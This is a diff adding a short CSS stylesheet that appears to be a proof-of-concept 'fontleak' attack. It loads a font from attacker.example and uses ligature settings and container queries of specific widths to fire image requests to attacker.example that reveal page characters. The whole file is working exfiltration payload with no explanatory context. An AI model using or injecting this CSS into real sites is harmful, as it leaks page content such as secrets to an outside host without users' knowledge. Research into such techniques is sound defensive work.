@@ -1,0 +1,31 @@
+@font-face {
+  font-family: "MetricLeak";
+  src: url("https://attacker.example/fontleak-static.woff2") format("woff2");
+}
+html {
+  container-type: inline-size;
+  width: 12px;
+}
+head {
+  container-type: size;
+  width: 100%;
+}
+.leak {
+  font-family: "MetricLeak";
+  font-feature-settings: "liga" 1, "salt" 2;
+  font-variant-ligatures: contextual;
+  width: fit-content;
+  white-space: pre;
+  font-size: 1000px;
+  line-height: 0;
+  overflow: hidden;
+}
+.leak::before {
+  font-family: "MetricLeak";
+  content: "\\100";
+}
+@container (width: 11px) {
+  head::before {
+    content: url("https://attacker.example/fontleak-character-0.png");
+  }
+}
